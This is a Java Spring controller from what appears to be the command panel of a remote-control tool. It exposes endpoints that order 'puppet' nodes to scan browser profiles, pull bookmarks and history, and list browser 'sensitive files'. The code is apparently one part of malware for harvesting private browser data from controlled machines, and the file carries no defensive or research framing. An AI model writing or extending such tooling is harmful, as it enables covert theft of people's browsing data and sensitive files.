package org.leo.web.controller.puppetnode.service;

import org.leo.web.util.ControllerUtil;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;

/**
 * 浏览器数据提取控制器
 */
@RestController
@RequestMapping("/puppet-node/browser-data")
public class BrowserDataController {

    @RequestMapping(value = "/scan-profiles", method = RequestMethod.POST)
    public HashMap<String, Object> scanProfiles(@RequestBody HashMap<String, Object> params) {
        return ControllerUtil.handlePuppetCall(params, "扫描浏览器失败", node -> node.scanBrowserProfiles());
    }

    @RequestMapping(value = "/bookmarks", method = RequestMethod.POST)
    public HashMap<String, Object> bookmarks(@RequestBody HashMap<String, Object> params) {
        return ControllerUtil.handlePuppetCall(params, "提取书签失败", node -> node.extractBrowserBookmarks());
    }

    @RequestMapping(value = "/history", method = RequestMethod.POST)
    public HashMap<String, Object> history(@RequestBody HashMap<String, Object> params) {
        int limit = ControllerUtil.getInt(params, "limit", 100);
        return ControllerUtil.handlePuppetCall(params, "提取历史记录失败", node -> node.extractBrowserHistory(limit));
    }

    @RequestMapping(value = "/sensitive-files", method = RequestMethod.POST)
    public HashMap<String, Object> sensitiveFiles(@RequestBody HashMap<String, Object> params) {
        return ControllerUtil.handlePuppetCall(params, "列出敏感文件失败", node -> node.listBrowserSensitiveFiles());
    }
}
